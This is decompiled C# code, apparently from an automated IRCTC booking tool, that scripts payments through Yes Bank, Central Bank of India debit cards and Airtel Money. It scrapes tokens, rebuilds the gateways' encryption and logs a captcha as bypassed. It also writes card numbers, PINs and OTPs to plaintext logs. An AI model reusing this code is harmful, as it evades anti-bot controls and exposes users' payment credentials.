                        {
                            updateTStatus_1.BeginInvoke(1, "Init. Yes_Confirm(4/6)", tCntrlName_, null, null);
                        }
                        if (!string_95.Contains("Please verify and confirm your request for electronic payment"))
                        {
                            string_90 = "Yes Unable to Process your Payment.";
                            clsMain.Lock("Fourth Hit, Not valid HTML err = " + string_90);
                            return false;
                        }
                        string text23 = "";
                        startIndex = string_95.IndexOf("sessionid") + 7;
                        startIndex = string_95.IndexOf("\"", startIndex) + 1;
                        length = string_95.IndexOf("\"", startIndex) - startIndex;
                        text19 = string_95.Substring(startIndex, length);
                        startIndex = string_95.IndexOf("requestid", startIndex) + 7;
                        startIndex = string_95.IndexOf("\"", startIndex) + 1;
                        length = string_95.IndexOf("\"", startIndex) - startIndex;
                        text13 = string_95.Substring(startIndex, length);
                        string text24 = method_139("fldCodOrgBrn", string_95);
                        text4 = string.Concat("fldAppId=RR&fldTxnId=XFT&fldScrnSeqNbr=03&fldSessionId=", text19, "&fldDeviceId=01&fldLangId=eng&fldRequestId=", text13, "&fldCodOrgBrn=", text24, "&fldCodCustId=", text, "&fldCodAcctNo=", text21, "&salution=&lastname=&epiRequestId=", text5, "&fldMerchCode=" + text6 + "&fldMerchName=" + text7 + "&fldMerchAcct=", text8, "&fldClientCode=" + text9 + "&fldMerchRefNbr=", text10, "&fldSucStatFlg=N&fldFailStatFlg=N&fldTxnCurr=INR&fldTxnAmt=", text11, "&fldTxnScAmt=", text12, "&fldAction=&fldErrorCode=");
                        clsMain.Lock("Fifth Hit : Inp = " + text4);
                        if (!_Request(string_94, text4, string_91, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_95, ref string_92, ref webException_0))
                        {
                            clsMain.Lock("Fifth Hit Failed. err = " + string_92);
                            string_90 = "Failed while making Payment. Payment Not Done";
                            return false;
                        }
                        clsMain.Lock("Fifth Hit Output = " + string_95);
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Init. Yes_OTP Finish(6/6)", tCntrlName_, null, null);
                        }
                        if (!string_95.Contains("Transaction Password"))
                        {
                            string_90 = "Yes Unable to Process your Payment.";
                            clsMain.Lock("Third Hit, Not valid HTML err = " + string_90);
                            return false;
                        }
                        if (string.IsNullOrEmpty(text2))
                        {
                            string text25 = Interaction.InputBox("Please enter Transaction Password of Yes Bank received on your mobile.", "Yes Bank", "", clsMain.control_0.PointToScreen(clsMain.rectangle_0.Location).X, clsMain.control_0.PointToScreen(clsMain.rectangle_0.Location).Y).Trim();
                            if (text25.Length >= 5)
                            {
                                text3 = text25;
                                clsMain.Lock("Yes Received from user OTP=" + text3);
                            }
                        }
                        else
                        {
                            string_95 = string_95.Replace("'", "\"");
                            startIndex = string_95.IndexOf("Your challenge");
                            length = string_95.IndexOf("\"", startIndex) - startIndex;
                            string input = string_95.Substring(startIndex, length);
                            input = Regex.Replace(input, "\\D", "");
                            text23 = input.Insert(4, "+");
                            text3 = method_13("Yes||" + string_88 + "||" + input);
                            clsMain.Lock("Yes generated AuthCode=" + input + "   pin=" + text2 + "  OTP=" + text3);
                        }
                        text13 = method_139("fldRequestId", string_95);
                        if (text23.Length <= 1)
                        {
                            text4 = string.Concat("fldAppId=RR&fldTxnId=XFT&fldScrnSeqNbr=03&fldSessionId=", text19, "&fldRequestId=", text13, "&fldPinSequence=1&fldPin=", text3, "&fldVoiceIVROTP=&fldEmailOTP=&fldPinRequired=Y&fldNRCustomer=N&isOTPDone=&pinxslreqd=O&enableEmailTime=60000&fldLoginCustId=", text, "&fldChallenge=&fldLoginUserToken=RR%3A%3A&fldLangId=eng&fldAppId=RR&fldAppId=RR&fldMerchAcct=", text8, "&fldCodOrgBrn=", text24, "&fldAccountMapFlag=N&fldScrnSeqNbr=03&fldScrnSeqNbr=03&fldLoginUserId=", text, "&fldCodAcctNo=", text21, "&fldDeviceId=01&fldLoginUserGroupType=N&enableEmailTime=60000&fldIdChannel=2&fldLoginUserType=O&fldMerchCode=" + text6 + "&fldMerchName=" + text7 + "&fldMerchRefNbr=", text10, "&fldTxnAmt=", text11, "&fldTxnId=XFT&fldTxnId=XFT&fldTxnLimitFlag=N&fldFailStatFlg=N&fldTxnCurr=INR&fldLoginUserCss=default.css&fldLoginUserGroupBaseType=E&fldVoiceIVROTP=VoiceIVR_OTP&fldClientCode=" + text9 + "&fldTxnScAmt=", text12, "&fldCodCustId=", text, "&fldProxyUserFlag=N&pinxslreqd=O&fldSucStatFlg=N&epiRequestId=", text5, "&fldPinSequence=1");
                        }
                        else
                        {
                            string[] array3 = new string[28]
                            {
                                "fldAppId=RR&fldTxnId=XFT&fldScrnSeqNbr=03&fldSessionId=", text19, "&fldRequestId=", text13, "&fldPinSequence=1&fldPin=", null, null, null, null, null,
                                null, null, null, null, null, null, null, null, null, null,
                                null, null, null, null, null, null, null, null
                            };
                            array3[5] = text3;
                            array3[6] = "&fldChallengeRequired=Y&isOTPDone=&pinxslreqd=T&pinAuthFailed=&fldMerchRefNbr=";
                            array3[7] = text10;
                            array3[8] = "&fldClientCode=" + text9 + "&fldLoginUserType=O&fldLoginUserGroupBaseType=E&fldLangId=eng&fldAppId=RR&fldTxnScAmt=";
                            array3[9] = text12;
                            array3[10] = "&fldMerchAcct=";
                            array3[11] = text8;
                            array3[12] = "&fldTxnAmt=";
                            array3[13] = text11;
                            array3[14] = "&fldChallenge=";
                            array3[15] = text23;
                            array3[16] = "&fldTxnLimitFlag=N&fldFailStatFlg=N&fldLoginUserToken=RR%3A%3A&fldCodAcctNo=";
                            array3[17] = text21;
                            array3[18] = "&fldSucStatFlg=N&fldAccountMapFlag=N&epiRequestId=";
                            array3[19] = text5;
                            array3[20] = "&fldScrnSeqNbr=03&fldCodOrgBrn=";
                            array3[21] = text24;
                            array3[22] = "&fldLoginUserGroupType=N&fldCodCustId=";
                            array3[23] = text;
                            array3[24] = "&fldLoginUserCss=default.css&fldProxyUserFlag=N&fldIdChannel=2&fldMerchCode=" + text6 + "&fldMerchName=" + text7 + "&fldLoginUserId=";
                            array3[25] = text;
                            array3[26] = "&fldTxnCurr=INR&fldDeviceId=01&fldTxnId=XFT&fldLoginCustId=";
                            array3[27] = text;
                            text4 = string.Concat(array3);
                        }
                        clsMain.Lock("Sixth Hit : Inp = " + text4);
                        if (!_Request(string_94, text4, string_91, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_95, ref string_92, ref webException_0))
                        {
                            clsMain.Lock("Sixth Hit Failed. err = " + string_92);
                            string_90 = "Failed while making Payment. Payment Not Done";
                            return false;
                        }
                        clsMain.Lock("Sixth Hit Output = " + string_95);
                        if (!string_95.Contains("Your payment has been processed successfully"))
                        {
                            string_90 = "Yes Unable to Process your Payment.";
                            clsMain.Lock("Sixth Hit, Not valid HTML err = " + string_90);
                            return false;
                        }
                        startIndex = string_95.IndexOf("var url");
                        startIndex = string_95.IndexOf("\"", startIndex) + 1;
                        length = string_95.IndexOf("\"", startIndex) - startIndex;
                        string_89 = string_95.Substring(startIndex, length);
                        string_90 = string_94;
                        result = true;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessYesNetBanking", ex.Message);
                    result = false;
                }
                return result;
            }
            return false;
        }

        private string method_13(string string_86)
        {
            string[] array = string_86.Split(new string[1] { "||" }, StringSplitOptions.RemoveEmptyEntries);
            if (array.Length != 2)
            {
                string string_87 = array[3];
                string_87 = Class12.smethod_26(string_87);
                string string_88 = array[4];
                string string_89 = array[5];
                return Class12.smethod_4(string_88, string_89, string_87);
            }
            string path = array[1];
            byte[] array2 = File.ReadAllBytes(path);
            File.Delete(path);
            int num = 0;
            for (int i = 0; i < array2.Length; i++)
            {
                if (array2[i] == 0)
                {
                    num = 0;
                    continue;
                }
                byte[] array3 = array2;
                int num2 = i;
                int num3 = num2;
                int num4 = num3;
                byte[] array4 = array3;
                int num5 = num4;
                array4[num5] ^= (byte)(num + 2);
                num++;
            }
            string @string = Encoding.Default.GetString(array2, 0, 20);
            string string2 = Encoding.Default.GetString(array2, 21, 6);
            string string3 = Encoding.Default.GetString(array2, 28, array2.Length - 28);
            string text = Class12.smethod_4(string2, string3, @string);
            @string = Class12.smethod_25(@string);
            if (MessageBox.Show("Your generated first OTP was: " + text + "\r\n\r\nIf this is correct Click Yes", "First OTP", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
            {
                return @string + "||" + string2;
            }
            return "";
        }

        private void method_100(string text171, string text4, object p, ref CookieContainer cookieContainer, bool v1, bool v2, int v3, ref string text172, ref bool bool_19, ref WebException webException_0, ref object httpStatusCode_0, ref string str)
        {
            throw new NotImplementedException();
        }

        internal bool method_131(string string_86, string string_87, string string_88, ref string string_89, ref string string_90, UpdateTStatus updateTStatus_2)
        {
            bool result = false;
            string_89 = "";
            string_90 = "";
            clsMain.Lock("Enter ProcessCBIDebit.");
            if (string_86.Contains("fssnet.co.in"))
            {
                string_89 = "";
                string string_91 = class3_0.string_70;
                string[] separator = new string[1] { "||" };
                string[] array = string_87.Split(separator, StringSplitOptions.None);
                string text = array[0].Trim();
                string text2 = array[6];
                string text3 = array[1];
                string text4 = array[2];
                string text5 = array[3];
                string string_92 = "";
                string text6 = class3_0.Method_SerialInp(string_86, ref string_92, false);
                CookieContainer cookieContainer_ = null;
                string string_93 = "";
                string string_94 = "";
                if (text3.Length == 2 && text3[0] == '0')
                {
                    text3 = text3.Substring(1, 1);
                }
                try
                {
                    bool_27 = true;
                    clsMain.Lock("First Hit Inp = " + text6);
                    if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_93);
                        string_90 = "CBI Debit Not Working - Payment Failed";
                        return false;
                    }
                    clsMain.Lock("First Output htm = " + string_94);
                    if (!string.IsNullOrEmpty(string_94.Trim()) && string_94.Contains("Card Holders Name"))
                    {
                        string text7 = "";
                        string text8 = "";
                        string text9 = "ECB";
                        string text10 = "";
                        string text11 = "";
                        string text12 = "";
                        string text13 = "";
                        int startIndex = string_94.IndexOf("function encrypData");
                        startIndex = string_94.IndexOf("var paymentId", startIndex);
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        int length = string_94.IndexOf("\"", startIndex) - startIndex;
                        text11 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("var encCaptcha");
                        startIndex = string_94.IndexOf("\"", startIndex) + 1;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        text7 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("CSRFToken", startIndex);
                        startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                        length = string_94.IndexOf("\"", startIndex) - startIndex;
                        text8 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("name=\"paymentId", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        text10 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("mrchWeb", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("mrchTrackId", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        text13 = string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        startIndex = string_94.IndexOf("mrchErrUrl", startIndex);
                        startIndex = string_94.IndexOf("lue='", startIndex) + 5;
                        length = string_94.IndexOf("'", startIndex) - startIndex;
                        string_94.Substring(startIndex, length).Replace("'", "").Trim();
                        clsMain.Lock("paymentIdKey: " + text11);
                        if (updateTStatus_2 != null)
                        {
                            clsMain.Lock("Get Encrypted Data, inp = " + text11 + "||" + text9 + "||" + text + "||" + text2 + "||" + text5 + "||" + text3 + "||" + text4);
                            updateTStatus_2(1001, text11 + "||" + text9 + "||" + text + "||" + text2 + "||" + text5 + "||" + text3 + "||" + text4, "");
                        }
                        if (clsMain.dictionary_5.ContainsKey(text11))
                        {
                            object obj = new object();
                            object obj2 = obj;
                            lock (obj2)
                            {
                                text12 = clsMain.dictionary_5[text11];
                                clsMain.Lock("Encrypted Data, out = " + text12);
                                clsMain.dictionary_5.Remove(text11);
                            }
                        }
                        if (text12.Length < 70)
                        {
                            text12 = method_77("HDFCDEBIT~~" + text11 + "||" + text9 + "||" + text + "||" + text2 + "||" + text5 + "||" + text3 + "||" + text4);
                            clsMain.Lock("EncServerHit out: " + text12);
                        }
                        if (text12.Length < 96)
                        {
                            string_90 = "Some thing went wrong with CBI Debit Payment";
                            clsMain.Lock("Encrypted values are not proper.");
                            return false;
                        }
                        string[] array2 = text12.Split(new string[1] { "||" }, StringSplitOptions.None);
                        text = array2[0];
                        text2 = array2[1];
                        text5 = array2[2];
                        string text14 = array2[7];
                        string text15 = array2[4];
                        clsMain.Lock("Loading Captcha");
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Provide Captcha for CBI Debit.", tCntrlName_, null, null);
                        }
                        clsMain.Lock("Loading Captcha, Not required, Bypassed");
                        if (updateTStatus_1 != null)
                        {
                            updateTStatus_1.BeginInvoke(1, "Provide Captcha for CBI Debit.", tCntrlName_, null, null);
                        }
                        string text16 = "B58D5";
                        string string_95 = text11 + text7 + text + text2 + "A" + text5 + text16 + text10 + "file:////fss50/axisbank/Config/ipay/instupd/32/MERCHANT/3201/CSS/style.css/fss50/axisbank/Config/ipay/instupd/32/MERCHANT/3201/Header/CBI803x79.jpg//fss50//axisbank//Config//ipay//brands//default//label.propertiesIRCTChttps://irctc.co.in" + text13 + "01000" + 0 + "Central Bank of Indiahttps://www.irctc.co.in/eticketing/BankResponse00320100032320100" + text14 + "D" + text15 + "/fss50/axisbank/Config/ipay/instupd/32/MERCHANT/3201/HTML/footer.html";
                        string string_96 = Class12.smethod_22(text8).ToString().ToUpper();
                        string text17 = Class12.smethod_20(Class12.smethod_22(Class12.smethod_20(string_95, string_96).ToString().ToUpper()).ToString().ToUpper(), string_96).ToString().ToUpper();
                        text17 += "^JTVFcGF5bWVudElkS2V5JTVFaGRuZGl2VHlwZSU1RWVuY0NhcHRjaGElNUVkZWJpdENhcmROdW1iZXIlNUVkZWJpdENhcmRob2xkZXJOYW1lJTVFY2FyZFBpblR5cGUlNUVjYXJkUGluJTVFcGFzc2xpbmUlNUVwYXltZW50SWQlNUVzdHlsZUNzcyU1RWhlYWRlckZpbGUlNUVsYWJlbEZpbGUlNUVtcmNoTmFtZSU1RW1yY2hXZWIlNUVtcmNoVHJhY2tJZCU1RXB5bW50SW5zdHJtbnRDQyU1RXB5bW50SW5zdHJtbnREQyU1RXB5bW50SW5zdHJtbnRBUCU1RXB5bW50SW5zdHJtbnRERCU1RWVjb21GbGclNUVjYXB0Y2hhRmxnJTVFaW5zdE5hbWUlNUVtcmNoRXJyVXJsJTVFYXZzRmxnJTVFaGVhZGVyVHlwZSU1RXRlcm1JZCU1RWluc3RJZCU1RW1yY2hJZCU1RW1hZXN0cm9DaGVja0ZsYWclNUVweW1udEluc3RybW50SU1QUyU1RWdyaXBzRmxhZyU1RWNyZWRpdE1vbnRoJTVFY3JlZGl0WWVhciU1RWRlYml0TW9udGglNUVjcmVkaXREZWJpdENoZWNrJTVFZGViaXRZZWFyJTVFcmRjJTVFcnVwYXlUcmFuVHlwZSU1RXNlbGVjdGVkVmFsdWUlNUVmb290ZXI%3D";
                        text6 = "paymentIdKey=" + text11 + "&hdndivType=&encCaptcha=" + text7.Replace("=", "%3D") + "&cspg=" + text17.Replace("^", "%5E") + "&CSRFToken=" + text8 + "&debitCardNumber=" + text + "&debitCardholderName=" + text2 + "&cardPinType=A&cardPin=" + text5 + "&cardCvd2pin=&passline=" + text16 + "&paymentId=" + text10 + "&styleCss=file%3A%2F%2F%2F%2Ffss50%2Faxisbank%2FConfig%2Fipay%2Finstupd%2F32%2FMERCHANT%2F3201%2FCSS%2Fstyle.css&headerFile=%2Ffss50%2Faxisbank%2FConfig%2Fipay%2Finstupd%2F32%2FMERCHANT%2F3201%2FHeader%2FCBI803x79.jpg&labelFile=%2F%2Ffss50%2F%2Faxisbank%2F%2FConfig%2F%2Fipay%2F%2Fbrands%2F%2Fdefault%2F%2Flabel.properties&mrchName=IRCTC&mrchWeb=https%3A%2F%2Firctc.co.in&mrchTrackId=" + text13 + "&pymntInstrmntCC=0&pymntInstrmntDC=1&pymntInstrmntAP=0&pymntInstrmntDD=0&ecomFlg=0&captchaFlg=" + 0 + "&instName=Central+Bank+of+India&mrchErrUrl=https%3A%2F%2Fwww.irctc.co.in%2Feticketing%2FBankResponse&avsFlg=0&headerType=0&termId=3201000&instId=32&mrchId=3201&maestroCheckFlag=0&pymntInstrmntIMPS=0&gripsFlag=&creditMonth=&creditYear=&debitMonth=" + text14 + "&creditDebitCheck=D&debitYear=" + text15 + "&rdc=&rupayTranType=&selectedValue=&footer=%2Ffss50%2Faxisbank%2FConfig%2Fipay%2Finstupd%2F32%2FMERCHANT%2F3201%2FHTML%2Ffooter.html";
                        string_91 = "https://securepayments.fssnet.co.in/ipay/paymentpage.htm";
                        string_92 = "https://securepayments.fssnet.co.in/ipay/paymentrouter.htm";
                        clsMain.Lock("Second Hit Inp = " + text6);
                        if (!_Request(string_92, text6, string_91, webProxy_3, ref cookieContainer_, true, true, 60000, 60000, ref string_94, ref string_93, ref webException_0))
                        {
                            clsMain.Lock("Second Hit Failed. err = " + string_93);
                            string_90 = "Failed while making Payment.";
                            return false;
                        }
                        clsMain.Lock("Second Hit output = " + string_94);
                        if (!string_94.Contains("Please wait your Transaction is getting processed"))
                        {
                            string_90 = "Failed while providing Debit Card Details.";
                            if (string_94.Contains("Invalid card number."))
                            {
                                string_90 = "Invalid card number.";
                            }
                            clsMain.Lock("Second Hit Failed. Check HTML strerr=" + string_90);
                            return false;
                        }
                        startIndex = string_94.IndexOf("result=") + 7;
                        length = string_94.IndexOf("&", startIndex) - startIndex;
                        bool flag;
                        if (flag = string_94.Substring(startIndex, length).ToUpper().Contains("NOT"))
                        {
                            clsMain.Lock("Payment Failed");
                            string_90 = "Invalid Card Details, Payment Failed!";
                            return false;
                        }
                        clsMain.Lock("Success ProcessCBIDebit isPaymentFailed = " + flag);
                        string_89 = string_94;
                        string_90 = string_92;
                        return true;
                    }
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessCBIDebit", ex.Message);
                    result = false;
                }
                finally
                {
                    bool_27 = false;
                }
                return result;
            }
            string_90 = "Some thing went wrong with CBI Payment";
            string string_97 = "Html doesn't contains fssnet.co.in, returning.";
            clsMain.Lock(string_97);
            return false;
        }

        private void method_132(object object_18)
        {
            int minute = DateTime.Now.Minute;
            string text = object_18.ToString();
            UpdateTStatus updateTStatus = updateTStatus_1;
            string_69 = "";
            clsMain.Lock("Enter ProcessAirtelMoney.");
            while (true)
            {
                string string_ = class3_0.string_70;
                string[] array = text.Split(new string[1] { "||" }, StringSplitOptions.None);
                string text2 = array[0].Trim();
                string text3 = array[1];
                string text4 = "";
                CookieContainer cookieContainer_ = null;
                string string_2 = "";
                string string_3 = "";
                try
                {
                    string text5 = DateTime.Now.ToString("hh:mm:ss");
                    string_ = "https://www.airtel.in/bank/api/v1/web/content/en-us/login?ts=" + text5 + "%20GMT+0530%20(India%20Standard%20Time)";
                    clsMain.Lock("Airtel DETAILS: ");
                    string text6 = "ECOMBHHHOLBU0Tr";
                    clsMain.Lock("First Hit Inp = " + text4);
                    string_71 = "contentId=" + text6;
                    if (!_Request(string_, text4, "", webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_3, ref string_2, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_2);
                        break;
                    }
                    clsMain.Lock("First Output htm = " + string_3);
                    string_ = "https://www.airtel.in/bank/api/v1/auth/login/mpin";
                    text6 = "ECOMBHHHOLBU0Tr";
                    object obj = "{\"feSessionId\":\"" + text6 + "\",\"authType\":\"mPIN\",\"authValue\":\"" + text3 + "\",\"customerId\":\"" + text2 + "\"}";
                    string text7 = "Airtel";
                    updateTStatus?.Invoke(1002, text7 + "||" + obj, "");
                    object obj2 = new object();
                    object obj3 = obj2;
                    lock (obj3)
                    {
                        if (clsMain.dictionary_5.ContainsKey(text7))
                        {
                            string_68 = clsMain.dictionary_5[text7];
                            clsMain.Lock("Encrypted Data, out = " + string_68);
                            clsMain.dictionary_5.Remove(text7);
                        }
                    }
                    text4 = string_68;
                    bool_36 = true;
                    clsMain.Lock("First Hit Inp = " + text4);
                    string_71 = "contentId=" + text6;
                    if (!_Request(string_, text4, "", webProxy_3, ref cookieContainer_, false, true, 60000, 60000, ref string_3, ref string_2, ref webException_0))
                    {
                        clsMain.Lock("First Hit Failed. err = " + string_2);
                        break;
                    }
                    clsMain.Lock("First Output htm = " + string_3);
                    if (!string_3.Contains("description\":\"Success"))
                    {
                        continue;
                    }
                    frmOTP frmOTP = new frmOTP();
                    frmOTP.method_1(clsMain.control_0, clsMain.rectangle_0, false, "AIRTELMONEY", class3_0.BANKSAVEAS);
                    if (frmOTP.DialogResult != DialogResult.OK)
                    {
                        clsMain.Lock("OTP Cancel");
                        break;
                    }
                    string string_4 = frmOTP.string_0;
                    frmOTP.Dispose();
                    clsMain.dictionary_5.Add(text2, string_4);
                    break;
                }
                catch (Exception ex)
                {
                    clsMain.method_74("AirtelMoney", ex.Message);
                }
            }
        }

        internal bool Cash_AirtelMoney(string A_1, string A_2, string A_3, ref string A_4, ref string A_5, UpdateTStatus A_6)
        {
            int num = 0;
            A_4 = "";
            A_5 = "";
            object obj = new object();
            string_69 = "";
            clsMain.Lock("Enter ProcessAirtelMoney.");
            if (!A_1.Contains("airtel"))
            {
                A_5 = "Some thing went wrong with AirtelMoney Payment";
                clsMain.Lock("Html doesn't contains AirtelMoney, returning.");
                return false;
            }
            A_4 = "";
            string string_ = "";
            string[] array = A_2.Split(new string[1] { "||" }, StringSplitOptions.None);
            string text = array[0].Trim();
            string text2 = array[1];
            string text3 = "";
            string key = text + "_AirtelMoney";
            if (array.Length > 2)
            {
                text3 = array[2].Trim();
            }
            string string_2 = "";
            string text4 = class3_0.Method_SerialInp(A_1, ref string_2, false);
            CookieContainer cookieContainer_ = null;
            string string_3 = "";
            string string_4 = "";
            int num2 = 0;
            int num3 = 0;
            string text5 = "";
            string text6 = "";
            try
            {
                string text7 = text4.Substring(text4.IndexOf("encdata=") + 8);
                if (!_Request(string_2, text4, string_, webProxy_2, ref cookieContainer_, false, true, 60000, 60000, ref string_4, ref string_3, ref webException_0))
                {
                    clsMain.Lock("First Hit Failed. err = " + string_3);
                    A_5 = "AirtelMoney Not Working - Payment Failed";
                    return false;
                }
                string_ = "https://ecom.airtelbank.com/irctc/";
                clsMain.Lock("Airtel DETAILS: ");
                string text8 = "ECOM" + smethod_32(11);
                string_2 = string_ + "initiateEcom.action";
                text4 = "{\"encdata\":\"" + text7 + "\", \"merchantUIId\": \"irctc\",\"feSessionId\":\"" + text8 + "\"}";
                bool_23 = true;
                clsMain.Lock("First Hit Inp = " + text4);
                if (!_Request(string_2, text4, string_, webProxy_2, ref cookieContainer_, false, true, 60000, 60000, ref string_4, ref string_3, ref webException_0))
                {
                    clsMain.Lock("First Hit Failed. err = " + string_3);
                    A_5 = "AirtelMoney Not Working - Payment Failed";
                    return false;
                }
                clsMain.Lock("First Output htm = " + string_4);
                if (!string_4.Contains("convenienceCharges") && num2 == 0)
                {
                    clsMain.Lock("valid HTML, rehiting once more");
                    return false;
                }
                if (!string.IsNullOrEmpty(string_4.Trim()) && string_4.Contains("convenienceCharges"))
                {
                    bool_39 = true;
                    double result = 0.0;
                    double result2 = 0.0;
                    double.TryParse(GetString(string_4, "amount").Trim(), out result);
                    double.TryParse(GetString(string_4, "convenienceCharges").Trim(), out result2);
                    result += result2;
                    string_69 = GetString(string_4, "token");
                    string text9 = "Airtel";
                    object obj2 = "";
                    bool flag = false;
                    text8 = "ECOM" + smethod_32(11);
                    if (flag)
                    {
                        text4 = string_68;
                        string_2 = string_ + "ecomVerifyMpin.action";
                        clsMain.Lock("Second Hit Inp = " + text4);
                        obj2 = "{\"feSessionId\":\"" + text8 + "\",\"channel\":\"ANDROID\",\"mpin\":\"" + text2 + "\",\"customerId\":\"" + text + "\"}";
                        A_6?.Invoke(1002, text9 + "||" + obj2, "");
                        obj = new object();
                        lock (obj)
                        {
                            if (clsMain.dictionary_5.ContainsKey(text9))
                            {
                                string_68 = clsMain.dictionary_5[text9];
                                clsMain.Lock("Encrypted Data, out = " + string_68);
                                clsMain.dictionary_5.Remove(text9);
                            }
                        }
                        string_71 = "x-access-token#";
                        if (!_Request(string_2, text4, string_, webProxy_2, ref cookieContainer_, false, true, 60000, 60000, ref string_4, ref string_3, ref webException_0))
                        {
                            clsMain.Lock("Second Hit Failed. err = " + string_3);
                            A_5 = "AirtelMoney Not Working - Payment Failed";
                            return false;
                        }
                        clsMain.Lock("Second Output htm = " + string_4);
                        if (GetString(string_4, "ACCOUNT_ID").Length < 4)
                        {
                            A_5 = "Payment Failed Airtel Money.";
                            clsMain.Lock("Second Hit Failed Invalid response. err = " + A_5);
                            return false;
                        }
                        double.TryParse(GetString(string_4, "CURRENT_BAL").Trim(), out result2);
                        if (result > result2)
                        {
                            A_5 = "Less Balance in Airtel Money";
                            clsMain.Lock("Second Hit Failed. err = " + A_5);
                            return false;
                        }
                    }
                    while (true)
                    {
                        if (!flag)
                        {
                            num3 = 1;
                            clsMain.Lock("Second Hit OTP Required");
                            string_2 = string_ + "ecomSendOtp.action";
                            obj2 = "{\"feSessionId\":\"" + text8 + "\",\"customerId\":\"" + text + "\"}";
                            A_6?.Invoke(1002, text9 + "||" + obj2, "");
                            obj = new object();
                            lock (obj)
                            {
                                if (clsMain.dictionary_5.ContainsKey(text9))
                                {
                                    string_68 = clsMain.dictionary_5[text9];
                                    clsMain.Lock("Encrypted Data, out = " + string_68);
                                    clsMain.dictionary_5.Remove(text9);
                                }
                            }
                            text4 = string_68;
                            string text10 = method_140(string_4, "txnRefNO");
                            clsMain.Lock("OTP Hit Inp = " + text4);
                            string_71 = "x-access-token#" + string_69;
                            if (!_Request(string_2, text4, string_, webProxy_2, ref cookieContainer_, false, true, 60000, 60000, ref string_4, ref string_3, ref webException_0))
                            {
                                clsMain.Lock("OTP Hit Failed. err = " + string_3);
                                A_5 = "AirtelMoney Not Working - Payment Failed";
                                return false;
                            }
                            clsMain.Lock("OTP Output htm = " + string_4);
                            text5 = GetString(string_4, "verificationToken");
                            if (text5.Length <= 5)
                            {
                                A_5 = "Do 1 txn on IRCTC directly. Airtel required OTP";
                                clsMain.Lock("Second Hit Failed Invalid response. err = " + A_5);
                                return false;
                            }
                            text6 = text3;
                            if (clsMain.dictionary_5.ContainsKey(key))
                            {
                                text3 = clsMain.dictionary_5[key];
                                clsMain.dictionary_5.Remove(key);
                            }
                            if (text3 == "")
                            {
                                frmOTP frmOTP = new frmOTP();
                                frmOTP.method_1(clsMain.control_0, clsMain.rectangle_0, true, "AIRTELMONEY", class3_0.BANKSAVEAS);
                                if (frmOTP.DialogResult != DialogResult.OK)
                                {
                                    return false;
                                }
                                text3 = frmOTP.string_0;
                                frmOTP.Dispose();
                            }
                            string_2 = string_ + "ecomVerifyOtp.action";
                            text8 = "ECOM" + smethod_32(11);
                            obj2 = "{\"ver\":\"1.0\",\"languageId\":\"001\",\"feSessionId\":\"" + text8 + "\",\"secondFactorType\":\"OTP\",\"otp\":\"" + text6 + "\",\"channel\":\"ANDROID\",\"verificationToken\":\"" + text5 + "\",\"promoCode\":\"\",\"blockId\":\"\",\"cashBack\":\"\"}";
                            A_6?.Invoke(1002, text9 + "||" + obj2, "");
                            obj = new object();
                            lock (obj)
                            {
                                if (clsMain.dictionary_5.ContainsKey(text9))
                                {
                                    string_68 = clsMain.dictionary_5[text9];
                                    clsMain.Lock("Encrypted Data, out = " + string_68);
                                    clsMain.dictionary_5.Remove(text9);
                                }
                            }
                            text4 = string_68;
                            clsMain.Lock("OTP Hit Inp = " + text4);
                            bool_23 = true;
                            string_71 = "x-access-token#" + string_69;
                            if (!_Request(string_2, text4, string_, webProxy_2, ref cookieContainer_, false, true, 60000, 60000, ref string_4, ref string_3, ref webException_0))
                            {
                                clsMain.Lock("OTP Hit Failed. err = " + string_3);
                                A_5 = "AirtelMoney Not Working - Payment Failed";
                                return false;
                            }
                            clsMain.Lock("OTP Output htm = " + string_4);
                            if (string_4.IndexOf("rejected due") > 0)
                            {
                                continue;
                            }
                        }
                        string_69 = GetString(string_4, "token");
                        bool flag2 = num3 != 0;
                        text8 = GetString(string_4, "feSessionId");
                        obj2 = "{\"ver\":\"1.0\",\"languageId\":\"001\",\"feSessionId\":\"" + text8 + "\",\"secondFactorType\":\"mPIN\",\"value\":\"" + text2 + "\",\"channel\":\"ANDROID\",\"verificationToken\":\"" + text5 + "\",\"promoCode\":\"\",\"blockId\":\"\",\"cashBack\":\"\"}";
                        A_6?.Invoke(1002, text9 + "||" + obj2, "");
                        obj = new object();
                        lock (obj)
                        {
                            if (clsMain.dictionary_5.ContainsKey(text9))
                            {
                                string_68 = clsMain.dictionary_5[text9];
                                clsMain.Lock("Encrypted Data, out = " + string_68);
                                clsMain.dictionary_5.Remove(text9);
                            }
                        }
                        text4 = string_68;
                        string_2 = string_ + "ecomDoTxn.action";
                        clsMain.Lock("Third Hit Inp = " + text4);
                        string_71 = "x-access-token#" + string_69;
